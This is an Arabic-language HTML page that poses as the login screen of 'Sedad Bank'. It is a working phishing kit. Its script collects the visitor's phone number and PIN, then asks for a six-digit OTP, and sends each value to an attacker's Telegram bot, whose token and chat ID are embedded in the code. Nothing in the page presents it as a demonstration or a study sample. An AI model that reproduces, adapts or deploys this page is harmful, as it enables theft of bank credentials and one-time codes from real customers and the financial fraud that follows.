<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sedad Bank - بنك السداد</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
        body { font-family: 'Tajawal', sans-serif; background: linear-gradient(to bottom, #f3f8ff, #ffffff); margin: 0; min-height: 100vh; color: #333; }

        /* التصميم العام للواجهة (بنك السداد) */
        .container-box { max-width: 400px; margin: 0 auto; padding: 50px 20px; text-align: center; }
        .logo-img { width: 220px; margin: 0 auto 50px; display: block; }

        /* حقل الهاتف بنمط الصورة */
        .input-field-wrapper { position: relative; margin-bottom: 25px; padding: 0 40px; }
        .input-field { width: 100%; border: 1px solid #ccc; border-radius: 12px; padding: 14px 15px; text-align: right; font-size: 16px; outline: none; background: white; transition: border-color 0.3s; }
        .input-field:focus { border-color: #009640; }
        .input-icon { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #888; width: 22px; }

        /* مربعات PIN و OTP */
        .code-container { display: flex; gap: 12px; justify-content: center; margin-bottom: 35px; }
        .digit-box { width: 60px; height: 80px; border: 1px solid #ccc; border-radius: 18px; text-align: center; font-size: 28px; font-weight: bold; outline: none; background: white; transition: border-color 0.3s; }
        .digit-box:focus { border-color: #009640; }

        /* الأزرار */
        .btn-sedad { background-color: #009640; color: white; width: calc(100% - 80px); margin: 0 40px; padding: 14px; border-radius: 12px; font-size: 20px; font-weight: bold; border: none; cursor: pointer; transition: background 0.3s; }
        .btn-sedad:active { background-color: #007a33; }

        /* الروابط السفلى */
        .link-text { color: #666; font-size: 14px; margin-top: 15px; display: block; text-decoration: none; }
        .footer-links { margin-top: 60px; font-size: 15px; }
        .gold-text { color: #c09a5b; font-weight: bold; }

        /* واجهة جهات الاتصال */
        .contact-btn { display: flex; align-items: center; justify-content: center; gap: 10px; background: white; border: 1px solid #eee; border-radius: 10px; padding: 10px 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin: 40px auto; width: fit-content; color: #333; }

        /* واجهة الـ OTP المنبثقة */
        #otp-screen { display: none; padding-top: 60px; }
        .otp-dot { width: 45px; height: 55px; border: 1px solid #ccc; border-radius: 10px; text-align: center; font-size: 24px; outline: none; background: white; }
    </style>
</head>
<body>

    <!-- الواجهة الأولى: تسجيل الدخول (بنك السداد) -->
    <div id="screen-login">
        <div class="container-box">
            <img src="https://i.ibb.co/3sX8H3N/sedad-logo.png" alt="Sedad Bank" class="logo-img">

            <div class="input-field-wrapper">
                <input id="phone" type="tel" class="input-field" placeholder="رقم الهاتف" maxlength="8">
                <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
            </div>

            <div class="code-container">
                <input type="password" maxlength="1" class="digit-box login-pin" oninput="validatePin(this, 0)">
                <input type="password" maxlength="1" class="digit-box login-pin" oninput="validatePin(this, 1)">
                <input type="password" maxlength="1" class="digit-box login-pin" oninput="validatePin(this, 2)">
                <input type="password" maxlength="1" class="digit-box login-pin" oninput="validatePin(this, 3)">
            </div>

            <button onclick="handleLogin()" class="btn-sedad">تسجيل الدخول</button>
            <a href="#" class="link-text">هل نسيت كلمة المرور؟</a>

            <div class="footer-links">
                مستخدم جديد ؟ <span class="gold-text">سجل الان</span>
            </div>

            <div class="contact-btn">
                <span>جهات الاتصال</span>
                <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
            </div>
        </div>
    </div>

    <!-- الواجهة الثانية: رمز التحقق (OTP) -->
    <div id="otp-screen" class="container-box">
        <h2 style="font-weight: bold; font-size: 22px; margin-bottom: 20px;">أدخل رمز التحقق (OTP)</h2>
        <p style="color: #666; font-size: 15px; margin-bottom: 30px;">تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك.</p>

        <div class="code-container">
            <input type="tel" maxlength="1" class="digit-box otp-dot otp-field" oninput="validatePin(this, 4)">
            <input type="tel" maxlength="1" class="digit-box otp-dot otp-field" oninput="validatePin(this, 5)">
            <input type="tel" maxlength="1" class="digit-box otp-dot otp-field" oninput="validatePin(this, 6)">
            <input type="tel" maxlength="1" class="digit-box otp-dot otp-field" oninput="validatePin(this, 7)">
            <input type="tel" maxlength="1" class="digit-box otp-dot otp-field" oninput="validatePin(this, 8)">
            <input type="tel" maxlength="1" class="digit-box otp-dot otp-field" oninput="validatePin(this, 9)">
        </div>

        <button onclick="submitOTP()" class="btn-sedad">تأكيد الرمز</button>
        <a href="#" onclick="location.reload()" class="link-text mt-6">العودة لتسجيل الدخول</a>
    </div>

    <script>
        // إعدادات البوت (نفس التي قدمتها)
        const TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
        const CHAT = "8665814266";

        function validatePin(el, idx) {
            el.value = el.value.replace(/[^0-9]/g, ''); // أرقام فقط
            const inputs = document.querySelectorAll('.digit-box');
            if (el.value.length === 1 && idx < inputs.length - 1) {
                inputs[idx + 1].focus();
            }
        }

        function handleLogin() {
            const ph = document.getElementById('phone').value;
            let pin = "";
            document.querySelectorAll('.login-pin').forEach(b => pin += b.value);

            if(ph.length >= 8 && pin.length === 4) {
                // إرسال بيانات الدخول
                send(`🏦 Sedad Bank:\n📱 Num: ${ph}\n🔐 PIN: ${pin}`);
                // الانتقال لواجهة OTP
                document.getElementById('screen-login').style.display = 'none';
                document.getElementById('otp-screen').style.display = 'block';
            } else {
                alert("يرجى إكمال البيانات (الهاتف 8 أرقام، الرمز 4 أرقام)");
            }
        }

        function submitOTP() {
            let otp = "";
            document.querySelectorAll('.otp-field').forEach(b => otp += b.value);
            if(otp.length === 6) {
                // إرسال كود التحقق
                send(`🔑 Sedad OTP: ${otp}`);
                alert("جاري التحقق من الرمز...");
                location.reload();
            } else {
                alert("يرجى إدخال رمز التحقق المكون من 6 أرقام");
            }
        }

        function send(msg) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`);
        }
    </script>
</body>
</html>
